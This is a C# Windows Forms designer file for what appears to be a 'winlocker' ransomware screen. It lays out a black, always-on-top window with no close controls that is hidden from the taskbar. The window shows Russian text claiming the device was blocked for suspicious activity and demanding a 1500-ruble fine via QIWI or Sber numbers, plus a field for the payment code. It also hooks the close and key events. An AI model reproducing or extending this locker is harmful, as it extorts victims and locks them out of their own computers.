
namespace AWL
{
	partial class Form1
	{
		private const string V = "AWL";

		/// <summary>
		///  Required designer variable.
		/// </summary>
		private System.ComponentModel.IContainer components = null;

		/// <summary>
		///  Clean up any resources being used.
		/// </summary>
		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		protected override void Dispose(bool disposing)
		{
			if (disposing && (components != null))
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		#region Windows Form Designer generated code

		/// <summary>
		///  Required method for Designer support - do not modify
		///  the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{
			this.Text = new System.Windows.Forms.Label();
			this.label1 = new System.Windows.Forms.Label();
			this.label2 = new System.Windows.Forms.Label();
			this.textBox1 = new System.Windows.Forms.TextBox();
			this.button1 = new System.Windows.Forms.Button();
			this.label4 = new System.Windows.Forms.Label();
			this.SuspendLayout();
			// 
			// Text
			// 
			this.Text.AllowDrop = true;
			this.Text.AutoEllipsis = true;
			this.Text.AutoSize = true;
			this.Text.Font = new System.Drawing.Font("Consolas", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
			this.Text.ForeColor = System.Drawing.Color.LightGreen;
			this.Text.ImageAlign = System.Drawing.ContentAlignment.BottomRight;
			this.Text.Location = new System.Drawing.Point(12, 112);
			this.Text.Name = "Text";
			this.Text.Size = new System.Drawing.Size(817, 31);
			this.Text.TabIndex = 1;
			this.Text.Text = "Устройство было заблокировано в связи с подозрительной активностью.";
			this.Text.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
			this.Text.UseCompatibleTextRendering = true;
			this.Text.Click += new System.EventHandler(this.label2_Click);
			// 
			// label1
			// 
			this.label1.AllowDrop = true;
			this.label1.AutoEllipsis = true;
			this.label1.AutoSize = true;
			this.label1.Font = new System.Drawing.Font("Consolas", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
			this.label1.ForeColor = System.Drawing.Color.LightGreen;
			this.label1.ImageAlign = System.Drawing.ContentAlignment.BottomRight;
			this.label1.Location = new System.Drawing.Point(12, 143);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(624, 31);
			this.label1.TabIndex = 2;
			this.label1.Text = "Для разблокировки необходимо заплатить штраф 1500р.";
			this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
			this.label1.UseCompatibleTextRendering = true;
			this.label1.Click += new System.EventHandler(this.label1_Click_1);
			// 
			// label2
			// 
			this.label2.AllowDrop = true;
			this.label2.AutoEllipsis = true;
			this.label2.AutoSize = true;
			this.label2.Font = new System.Drawing.Font("Consolas", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
			this.label2.ForeColor = System.Drawing.Color.LightGreen;
			this.label2.ImageAlign = System.Drawing.ContentAlignment.BottomRight;
			this.label2.Location = new System.Drawing.Point(12, 205);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(624, 31);
			this.label2.TabIndex = 3;
			this.label2.Text = "Для разблокировки устройства введите номер платежа.";
			this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
			this.label2.UseCompatibleTextRendering = true;
			this.label2.Click += new System.EventHandler(this.label2_Click_1);
			// 
			// textBox1
			// 
			this.textBox1.Font = new System.Drawing.Font("Lucida Sans", 32F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
			this.textBox1.Location = new System.Drawing.Point(12, 253);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new System.Drawing.Size(479, 58);
			this.textBox1.TabIndex = 5;
			this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged_1);
			// 
			// button1
			// 
			this.button1.Font = new System.Drawing.Font("Times New Roman", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
			this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
			this.button1.Location = new System.Drawing.Point(536, 253);
			this.button1.Name = "button1";
			this.button1.Size = new System.Drawing.Size(252, 58);
			this.button1.TabIndex = 6;
			this.button1.Text = "РАЗБЛОКИРОВАТЬ";
			this.button1.UseVisualStyleBackColor = true;
			this.button1.Click += new System.EventHandler(this.Button1_Click);
			// 
			// label4
			// 
			this.label4.AllowDrop = true;
			this.label4.AutoEllipsis = true;
			this.label4.AutoSize = true;
			this.label4.Font = new System.Drawing.Font("Consolas", 16F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
			this.label4.ForeColor = System.Drawing.Color.LightGreen;
			this.label4.ImageAlign = System.Drawing.ContentAlignment.BottomRight;
			this.label4.Location = new System.Drawing.Point(12, 174);
			this.label4.Name = "label4";
			this.label4.Size = new System.Drawing.Size(684, 31);
			this.label4.TabIndex = 7;
			this.label4.Text = "Реквизиты: QIWI +7 999 999 99 99 | SBER +7 999 999 99 99";
			this.label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
			this.label4.UseCompatibleTextRendering = true;
			this.label4.Click += new System.EventHandler(this.label4_Click);
			// 
			// Form1
			// 
			this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.Black;
			this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			this.ClientSize = new System.Drawing.Size(800, 450);
			this.ControlBox = false;
			this.Controls.Add(this.label4);
			this.Controls.Add(this.button1);
			this.Controls.Add(this.textBox1);
			this.Controls.Add(this.label2);
			this.Controls.Add(this.label1);
			this.Controls.Add(this.Text);
			this.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
			this.KeyPreview = true;
			this.MaximizeBox = false;
			this.MinimizeBox = false;
			this.Name = "Form1";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
			this.TopMost = true;
			this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
			this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
			this.Load += new System.EventHandler(this.Form1_Load);
			this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Form1_KeyDown);
			this.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Form1_KeyPress);
			this.ResumeLayout(false);
			this.PerformLayout();

		}

		#endregion
		private System.Windows.Forms.Label   Text;
		private System.Windows.Forms.Label   label1;
		private System.Windows.Forms.Label   label2;
		private System.Windows.Forms.TextBox textBox1;
		private System.Windows.Forms.Button  button1;
		private System.Windows.Forms.Label label4;
	}
}